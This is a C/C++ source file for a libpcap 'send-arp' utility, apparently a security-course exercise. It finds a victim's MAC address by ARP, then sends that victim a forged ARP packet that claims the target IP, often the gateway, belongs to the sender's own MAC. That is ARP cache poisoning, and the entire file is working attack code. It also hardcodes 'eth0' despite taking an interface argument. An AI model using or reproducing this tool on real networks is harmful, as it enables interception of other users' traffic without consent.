#include <pcap.h>
#include <headers.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

#define ARP 0X0806
#define Ethernet 0X0001
#define IPv4 0X0800
#define Request 0X0001
#define SIZE_IPADD 0x04

void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip> \n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

struct EtherArpPacket {
    Etherheader ether;
    ARPheader arp;
};

void get_mac(uint8_t smac[])
{
    struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

    strcpy(s.ifr_name, "eth0");
    if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) {
        int i;
        for (i=0;i<6;++i) {
            smac[i] = (unsigned char) s.ifr_addr.sa_data[i];
        }
    }
}

char* get_ip()
{
    int fd;
    struct ifreq ifr;

    fd = socket(AF_INET, SOCK_DGRAM, 0);

    /* I want to get an IPv4 IP address */
    ifr.ifr_addr.sa_family = AF_INET;

    /* I want IP address attached to "eth0" */
    strncpy(ifr.ifr_name, "eth0", IFNAMSIZ-1);

    ioctl(fd, SIOCGIFADDR, &ifr);

    close(fd);

    return inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
}

void sendpacket(pcap_t* handle, EtherArpPacket rqpacket) {
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&rqpacket), sizeof(EtherArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    EtherArpPacket rqpacket;

    char const* s1 = "0xff 0xff 0xff 0xff 0xff 0xff";
    char* end;
    rqpacket.ether.dmac[0] = strtol(s1, &end, 16);
    for (int i=1; i<6;i++) {
        rqpacket.ether.dmac[i] = strtol(end, &end, 16);
    }
    get_mac(rqpacket.ether.smac);
    rqpacket.ether.etype = htons(ARP);

    rqpacket.arp.htype = htons(Ethernet);
    rqpacket.arp.ptype = htons(IPv4);
    rqpacket.arp.hal = sizeof(rqpacket.ether.dmac);
    rqpacket.arp.pal = SIZE_IPADD;
    rqpacket.arp.opcode = htons(Request);
    get_mac(rqpacket.arp.smac);
    inet_pton(AF_INET, get_ip(), &rqpacket.arp.sip);
    char const* s2 = "0x00 0x00 0x00 0x00 0x00 0x00";
    char* end2;
    rqpacket.arp.tmac[0] = strtol(s2, &end2, 16);
    for (int i=1; i<6; i++) {
        rqpacket.arp.tmac[i] = strtol(end2, &end2, 16);
    }
    inet_pton(AF_INET, argv[2], &rqpacket.arp.tip);

    sendpacket(handle, rqpacket);

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* rppacket;

        int res = pcap_next_ex(handle, &header, &rppacket);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
                       break;
            }
            const struct Etherheader* ethernet = (struct Etherheader*)(rppacket);
            if (ntohs(ethernet->etype) != ARP) continue;

            const struct ARPheader* arp = (struct ARPheader*)(rppacket + sizeof(Etherheader));
            if (ntohs(arp->opcode) ==0x0002 && arp->sip == rqpacket.arp.tip && arp->tip == rqpacket.arp.sip) {
                for (int i=0; i<6; i++) {
                    rqpacket.ether.dmac[i] = arp->smac[i];
                    rqpacket.arp.tmac[i] = arp->smac[i];
                }
                inet_pton(AF_INET, argv[3], &rqpacket.arp.sip);
            }

            sendpacket(handle, rqpacket);
            break;
    }

    pcap_close(handle);
}

